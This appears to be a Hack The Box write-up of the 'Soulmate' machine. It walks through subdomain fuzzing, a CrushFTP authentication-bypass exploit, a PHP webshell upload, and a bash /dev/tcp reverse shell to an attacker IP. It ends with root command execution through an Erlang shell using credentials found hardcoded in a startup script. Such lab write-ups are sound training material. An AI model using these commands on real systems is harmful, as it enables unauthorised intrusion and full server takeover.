@@ -1,0 +1,138 @@
+Title: Soulmate
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Soulmate was a Linux box centered on a CrushFTP server reachable only through a discovered subdomain, an unauthenticated authentication-bypass CVE against that FTP server, and an exposed Erlang distribution service that turned out to be an interactive administrative shell listening only on localhost. Bypassing CrushFTP's authentication allowed a new account to be created and escalated to an existing admin user, which in turn allowed a malicious PHP webshell to be uploaded to the main site's web root for command execution and a foothold as `ben`. From there, an Erlang login script found on disk revealed hardcoded credentials and a second, internal-only SSH listener bound to an Erlang shell, and dropping into that shell's `os:cmd/1` function ran commands directly as `root`.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.86
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4369/tcp open  epmd
+
+> nmap -sC -sV -p22,80,4369 10.10.11.86
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://soulmate.htb/
+4369/tcp open  epmd    Erlang Port Mapper Daemon
+| epmd-info:
+|   epmd_port: 4369
+|   nodes:
+|_    ssh_runner: 37435
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Alongside the expected SSH and HTTP ports, `epmd` (the Erlang Port Mapper Daemon) was exposed and already advertising a registered node named `ssh_runner`, a strong early signal that some part of the box was built on Erlang and exposed a distribution-protocol service worth revisiting later. The main site on port 80 redirected to `soulmate.htb` and returned a 504 Gateway Timeout, suggesting the front-end was proxying to a backend that wasn't (yet) reachable directly.
+
+## Subdomain Enumeration - Finding the FTP Panel
+
+With the host added for virtual-host resolution, a subdomain fuzz against `soulmate.htb` turned up a hidden FTP-branded vhost:
+
+```
+> ../../mine/dns_subdomain.sh soulmate.htb 10.10.11.86 on
+> ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://FUZZ.soulmate.htb/ -fs 154
+ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 174ms]
+> ../../mine/dns_subdomain.sh soulmate.htb 10.10.11.86 off
+```
+
+Browsing to `http://ftp.soulmate.htb/` identified the service as CrushFTP. A quick search for known CrushFTP exploits surfaced two relevant CVEs, CVE-2025-54309 and CVE-2025-31161, the latter being an authentication bypass.
+
+## CrushFTP Authentication Bypass - CVE-2025-31161
+
+Searching for a public exploit for CVE-2025-31161 led to a working proof-of-concept:
+
+```
+https://github.com/Immersive-Labs-Sec/CVE-2025-31161
+```
+
+The script defaulted to HTTPS, which didn't match the target's plain-HTTP listener, so every `https` reference in the script had to be swapped to `http` before it would work against this host. Running it created a brand-new, fully-privileged CrushFTP user without needing any prior credentials:
+
+```
+> python3 test.py --target_host ftp.soulmate.htb --port 80 --new_user tester --password tester123
+[+] Exploit Complete you can now login with
+   [*] Username: tester
+   [*] Password: tester123.
+```
+
+Logging in as the newly created `tester` account and opening the admin User Manager allowed resetting the password of an existing user, `ben`, to an attacker-known value. Logging in as `ben` unlocked write access to a `webProd` share, which mapped to the live web root and allowed uploading a PHP webshell (`webshell.php`) for remote command execution. CrushFTP's cleanup routine periodically removed the uploaded file, so it occasionally had to be re-uploaded before it could be triggered.
+
+## Foothold - Webshell to ben
+
+The uploaded webshell was used to explore the filesystem and confirm database access:
+
+```
+http://soulmate.htb/websh.php?cmd=strings ../data/soulmate.db
+```
+
+This dumped an admin username and a bcrypt hash from the application's SQLite database:
+
+```
+admin$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2
+```
+
+The hash didn't crack against common wordlists, so rather than pursue it further, the webshell was used directly to get an interactive shell:
+
+```
+> http://soulmate.htb/websh.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.184/4444 0>%261'
+> python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+This granted a shell as the web-server user, with `/home` showing only a single user, `ben`, on the box.
+
+## Privilege Escalation - Erlang Shell as root
+
+Running `linpeas` (and independently checking listening sockets) showed a cluster of services bound only to loopback, including a second SSH-style listener on port 2222 alongside the Erlang-related ports noted during recon:
+
+```
+tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -
+```
+
+Digging around the filesystem turned up the script backing that internal service:
+
+```
+> cat /usr/local/lib/erlang_login/start.escript
+```
+
+The script hardcoded a credential pair for logging into the Erlang-backed SSH daemon on port 2222:
+
+```
+user_passwords, [{"ben", "HouseH0ldings998"}]
+```
+
+Those credentials worked both for the box's normal SSH service and for the internal Erlang SSH listener:
+
+```
+> ssh ben@10.10.11.86
+> ssh ben@localhost -p 2222
+```
+
+The port 2222 service dropped straight into an Erlang shell rather than a normal login shell. Listing available functions and confirming the `os` module was loaded showed a direct path to command execution:
+
+```
+> help().
+> m().
+> os:cmd(whoami).
+"root\n"
+> os:cmd("cat /root/root.txt").
+```
+
+Because the escript-driven SSH daemon ran as `root`, any command run through `os:cmd/1` from inside that shell executed with full root privileges, reading the root flag directly.
+
+## Takeaways
+
+- An `epmd` service advertising a named node during recon is a strong early hint that something on the box is Erlang-based and worth revisiting once other footholds are found, since Erlang distribution and Erlang-backed shells behave very differently from standard services.
+- Subdomain fuzzing is worth doing even when the main vhost looks broken (504s, redirects); the working attack surface is sometimes hidden behind a vhost that was never linked from the visible site.
+- Public PoCs for CVEs are often written against a specific transport (HTTPS) or environment assumption; a quick find-and-replace to match the target's actual configuration (plain HTTP here) can be the only change needed to make an otherwise-correct exploit work.
+- Application-level admin panels (like CrushFTP's User Manager) are a fast, low-friction way to pivot from a freshly created low-trust account to full control over another user's credentials and, from there, to file write access on a production web root.
+- Anti-persistence or cleanup automation on a target (re-deleting uploaded webshells) doesn't defeat an attack, it just means re-uploading; it's worth noting as an environment quirk rather than treating it as a dead end.
+- Hardcoded credentials embedded in a service's startup script are a common way for internal-only administrative interfaces to be secured, and if that interface is a language shell (like an Erlang shell) rather than a restricted CLI, gaining access to it can mean immediate arbitrary code execution as whatever user runs the service.
